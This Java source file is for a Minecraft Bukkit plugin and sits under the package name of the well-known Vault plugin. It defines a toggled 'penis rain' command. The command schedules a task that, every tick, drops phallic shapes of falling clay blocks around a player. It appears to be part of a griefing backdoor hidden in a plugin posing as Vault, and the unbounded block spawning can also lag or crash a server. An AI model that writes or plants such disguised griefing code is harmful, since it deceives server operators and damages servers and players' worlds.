package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Penis extends CommandManager {
	private static int ID;
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (ID == 0) {
			ID = new BukkitRunnable() {
				@SuppressWarnings("deprecation")
				public void run() {
		              int x = (int)p.getLocation().getX() + (int)(Math.random() * 100.0D) - 50;
		              int y = (int)p.getLocation().getY() + 50;
		              int z = (int)p.getLocation().getZ() + (int)(Math.random() * 100.0D) - 50;
		              for (int i = 0; i < 3; i++) {
		                p.getWorld().spawnFallingBlock(new Location(p.getWorld(), x + i, y, z), Material.STAINED_CLAY, (byte)6);
		              }
		              for (int i = 1; i < 4; i++) {
		                p.getWorld().spawnFallingBlock(new Location(p.getWorld(), x + 1, y + i, z), Material.STAINED_CLAY, (byte)6);
		              }
		            }
		          }.runTaskTimer(plugin, 1L, 1L).getTaskId();
		          p.sendMessage(Settings.PREFIX("Started penis rain"));
		          
		} else {
			Bukkit.getScheduler().cancelTask(ID);
			ID = 0;
			p.sendMessage(Settings.PREFIX("Stopped penis rain"));
		}
	}

}
